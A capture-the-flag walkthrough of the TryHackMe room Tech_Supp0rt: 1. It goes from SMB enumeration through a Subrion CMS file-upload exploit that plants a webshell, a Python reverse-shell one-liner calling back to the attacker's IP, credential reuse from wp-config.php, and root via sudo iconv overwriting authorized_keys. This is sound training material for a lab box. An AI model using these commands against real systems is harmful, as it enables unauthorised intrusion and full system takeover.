---
title: "TryHackMe - Tech_Supp0rt: 1 Writeup"
category: [TryHackMe, Writeup]
tags: [TryHackMe,THM Easy, writeup]
img_path: /assets/img
---
[![TryHackme TechSupp0rt1](TechSupp0rt1.png)](https://tryhackme.com/room/techsupp0rt1)

Let's begin by doing a Nmap scan of the target machine. 

```shell
sudo nmap -Pn -p- -sS -sV -sC -oN nmap-tcp-scan -v 10.10.21.67 --open
```
We can see multiple ports open including SSH, HTTP, and SMB.

```plaintext
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-10-17T23:19:51
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-10-18T04:49:52+05:30
|_clock-skew: mean: -1h50m00s, deviation: 3h10m30s, median: -1s
```

The default scripts run by nmap, using the -sC option, indicates that a guest level account can authenticate to the SMB service. Let's verify that we can use a NULL session to list out the SMB shares.
```shell
smbclient -L //10.10.21.67 -N
```
```plaintext
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        websvr          Disk      
        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP       
```
We can see that there is a share by the name of websvr, let's see if we can access it.
```shell
smbclient //10.10.21.67/websvr -N
```
Success! We can now list out the files and download them to our machine to review at our leisure.
```shell
smb: \> dir
  .                                   D        0  Sat May 29 02:17:38 2021
  ..                                  D        0  Sat May 29 02:03:47 2021
  enter.txt                           N      273  Sat May 29 02:17:38 2021

                8460484 blocks of size 1024. 5778776 blocks available

smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.6 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```
If we cat out the enter.txt file we can see that there are a few notes about their websites one called subrion and the other a wordpress site. Also there appears to be  a user name and password for a website called Subrion. Googling Subrion shows that is a CMS.
```plaintext
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:<redacted> [cooked with magical formula]
Wordpress creds
|->
```
 {: file="enter.txt" }

Copying what looks like the an encoded or hashed password. Using hashid on the strintg we get a "[+] Unknown hash" message. Reading the "cooked with magical formula" note leads me to believe it is a clue to use the [Cyberchef](https://gchq.github.io/CyberChef/) and use the "Magic" recipe.
This leads it to string being decoded.

Great we have a user name and password for the subrion website. According to the comments though it does not work and they need to fix it. But it appears we can fix it if we use the panel. Going to the website http://10.10.21.67/subrion yields nothing. But going to http://10.10.21.67/subrion/panel we are preseted with a login page for subrion and the CMS version number is 4.2.1.
![Subrion Login Page](subrion-panel-login.png)
We can use the username of admin and the decoded password to verify that it works and it allows us to login.
Using searchsploit with the terms subrion we can see that our verision has an arbitrary file upload. This could allow use to upload either a web shell or reverse shell file to compromise the target.

Luckily the python script from searchsploit will do this for us and give us a semi interactive shell.
```shell
searchsploit -m 49876

python3 49876.py --url http://10.10.21.67/subrion/panel/ --user admin --passw <redacted>

[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.21.67/subrion/panel/
[+] Success!
[+] Got CSRF token: TLO7LXgr4Xg5tBSDE3pr4eqUhOjJRwefJMY5bq1A
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: dprdjcjrqkgelqz

[+] Trying to Upload Webshell..
http://10.10.21.67/subrion/uploads/
[+] Upload Success... Webshell path: http://10.10.21.67/subrion/panel/uploads/dprdjcjrqkgelqz.phar 

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ ip address
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:91:99:d6:e7:63 brd ff:ff:ff:ff:ff:ff
    inet 10.10.21.67/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::91:99ff:fed6:e763/64 scope link 
       valid_lft forever preferred_lft forever
```
We now have a semi interactive shell, but we can't change directories, we don't have tab autocomplete, etc. Let see if we can get a better shell. We start a netcat listener on port 443 and using a Firefox addon called HackTools we can enter our IP address and port we can choose a suitable reverse shell payload. Using the Bash reverse shell did not work for me so I decided to use the Python one.
```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.1.196",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
To stabalize the shell and give us the tab autocomplete, the use of the arrow keys, etc. we following the guide at [Ropnop Blog's](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) using the stty method in the tl;dr section.
```shell
^Z

stty raw -echo; fg;
export TERM=xterm-256color
stty rows 52 cols 236
````
We now have a much better shell to work with. But we are only www-data. Remember that the enter.txt file we downloaded earlier alluded to a wordpress site. Let's see if there are any credentials in the wp-config.php file. Catting out the configuration file we find a user name and password for a MySQL database.
```plaintext
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', '<redacted>' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```
{: file="/var/www/html/wordpress/wp-config.php" }
Listing out the lisening ports we do see a MySQL server but it contains nothing of interest other than the user name and password we arleady have from wp-config.php.
```shell
netstat -tulpn
```
```plaintext
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::445                  :::*                    LISTEN      -               
tcp6       0      0 :::139                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -   
```
Let see what other users are on the machine by catting out /etc/passwd and grepping for lines with sh in them. This will give use users with a shell defined.
```shell
cat /etc/passwd | grep sh
```
We see two users root and site. Lets check out scamsite's home directory.
```plaintext
root:x:0:0:root:/root:/bin/bash
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
```
Let check out the home directory for the scamsite user. We can see that these is a hidden file .sudo\_as\_admin\_successful which means they are probably a member of the sudoers group and can execute commands either elevated or as another user. We need to laterally move to that user. Lets try switching to the user scamsite with the password found in the wp-config.php file. Success!
Now we can see what we are allowed to run using sudo.
```shell
sudo -l
```
```plaintext
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```
Using [GTFOBins](https://gtfobins.github.io/) we can search for iconv to see if it can be used to escalate our privileges. It can, you can read or write files using iconv, since we are running as root we cat pretty much write to what we want. We could just read the root flag using iconv but we want to actually get root on the box to prove we can do it. There are couple ways of doing this but we will add a ssh key to the root users authorized_keys file. First let's see if root is allowed to ssh into the machine.
```shell
cat /etc/ssh/sshd_config | grep PermitRootLogin
```
According to the settings in sshd_config root is permitted to ssh.
```plaintext
PermitRootLogin yes
```
{: file="/etc/ssh/sshd_config" }
First we need to create a private and public key. On our kali machine so we run ssh-keygen.
```shell
ssh-keygen -f ~/root_id_rsa -t rsa -b 2048
```
I then copy the public key out of root\_id\_rsa.pub and use that to write the authorized_keys file in root's .ssh directory on the target machine.
```shell
echo '<pubic_key_copied_from_file>' | sudo iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
```
We can now ssh into the target machine and get the root flag from /root/root.txt.
```shell
ssh -i ~/root_id_rsa root@10.10.21.67
```
